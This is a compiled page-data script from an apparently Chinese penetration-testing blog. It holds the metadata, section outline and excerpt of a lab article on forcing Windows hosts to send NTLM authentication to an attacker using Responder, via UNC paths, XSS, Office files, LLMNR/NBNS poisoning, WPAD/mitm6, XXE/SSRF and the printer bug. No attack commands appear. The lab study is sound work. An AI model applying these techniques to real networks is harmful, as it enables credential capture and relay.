将该文件以记事本的方式开启，..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/deskktop.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"发送NTLM请求\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/deskktop.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/evil.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/v2hash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/20hash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/box.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/xss.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/listenhash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/priv.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/word.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr2.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr3.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/lan-setting.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/t019d8c1f08fefc8c39.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/dnc-llmnr.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/isa.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/12345.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1234566.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[]},{"level":2,"title":"图标","slug":"图标","link":"#图标","children":[]},{"level":2,"title":"系统命令携带UNC路径","slug":"系统命令携带unc路径","link":"#系统命令携带unc路径","children":[]},{"level":2,"title":"XSS","slug":"xss","link":"#xss","children":[]},{"level":2,"title":"outlook","slug":"outlook","link":"#outlook","children":[]},{"level":2,"title":"PDF","slug":"pdf","link":"#pdf","children":[]},{"level":2,"title":"Office","slug":"office","link":"#office","children":[]},{"level":2,"title":"MySql","slug":"mysql","link":"#mysql","children":[]},{"level":2,"title":"NBNS&LLMNR","slug":"nbns-llmnr","link":"#nbns-llmnr","children":[{"level":3,"title":"LLMNR","slug":"llmnr","link":"#llmnr","children":[]},{"level":3,"title":"NBNS","slug":"nbns","link":"#nbns","children":[]}]},{"level":2,"title":"WPAD&mitm6","slug":"wpad-mitm6","link":"#wpad-mitm6","children":[{"level":3,"title":"配合LLMNR/NBNS投毒","slug":"配合llmnr-nbns投毒","link":"#配合llmnr-nbns投毒","children":[]},{"level":3,"title":"配合DHCPv6","slug":"配合dhcpv6","link":"#配合dhcpv6","children":[]}]},{"level":2,"title":"XXE && SSRF","slug":"xxe-ssrf","link":"#xxe-ssrf","children":[]},{"level":2,"title":"打印机错误","slug":"打印机错误","link":"#打印机错误","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":11.29,"words":3387},"filePathRelative":"渗透测试/NTLM专题/发送NTLM请求.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>前言</h2>\\n<p>参考windows protocol进行实际操作，尝试从服务器向攻击者发起ntlm请求。</p>\\n<p>使用工具:Responder(可能会遇到版本较低问题，需要自己更新)</p>\\n<p>可能用到的机器</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>kali 192.168.30.128</span></span>\\n<span class=\\"line\\"><span>pc 192.168.30.20</span></span>\\n<span class=\\"line\\"><span>dc 192.168.30.10</span></span>\\n<span class=\\"line\\"><span>win10 192.168.30.30</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{o as comp,d as data};
